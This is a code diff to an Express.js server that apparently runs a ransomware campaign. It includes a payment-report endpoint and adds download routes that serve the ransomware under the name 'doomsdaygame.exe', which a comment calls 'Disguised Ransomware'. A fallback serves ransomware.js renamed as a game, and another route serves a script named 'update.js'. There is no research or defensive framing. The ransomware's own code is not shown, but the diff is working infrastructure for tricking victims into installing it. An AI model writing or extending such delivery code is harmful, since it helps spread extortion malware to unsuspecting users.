@@ -245,24 +245,38 @@ app.post('/api/report-payment', (req, res) => {
     res.json({ success: true });
 });
 
-// ===== DOWNLOAD =====
+// ===== DOWNLOAD DOOMSDAY GAME (Disguised Ransomware) =====
+app.get('/download/doomsdaygame.exe', (req, res) => {
+    const exePath = path.join(__dirname, 'builder', 'doomsdaygame.exe');
+    if (fs.existsSync(exePath)) {
+        res.download(exePath, 'doomsdaygame.exe');
+        console.log('🎮 doomsdaygame.exe downloaded');
+    } else {
+        // Fallback: send JS version
+        const jsPath = path.join(__dirname, 'client', 'ransomware.js');
+        if (fs.existsSync(jsPath)) {
+            res.download(jsPath, 'doomsdaygame.js');
+            console.log('📄 doomsdaygame.js downloaded (fallback)');
+        } else {
+            console.log('❌ Game not found');
+            res.status(404).send('❌ Game not found. Please try again later.');
+        }
+    }
+});
+
+// Keep the original download for backup
 app.get('/download/bloodgate.exe', (req, res) => {
     const exePath = path.join(__dirname, 'builder', 'Bloodgate.exe');
     if (fs.existsSync(exePath)) {
         res.download(exePath, 'Bloodgate_Setup.exe');
     } else {
-        // If EXE not built, send the JS version
-        const jsPath = path.join(__dirname, 'client', 'ransomware.js');
-        if (fs.existsSync(jsPath)) {
-            res.download(jsPath, 'update.js');
-        } else {
-            res.status(404).send('❌ Setup not found');
-        }
+        res.status(404).send('❌ Setup not found');
     }
 });
 
-app.get('/download/ransomware.js', (req, res) => {
-    const jsPath = path.join(__dirname, 'client', 'ransomware.js');
+// Keep ransomware.js download
+app.get('/download/doomsdayplay.js', (req, res) => {
+    const jsPath = path.join(__dirname, 'client', 'doomsdayplay.js');
     if (fs.existsSync(jsPath)) {
         res.download(jsPath, 'update.js');
     } else {
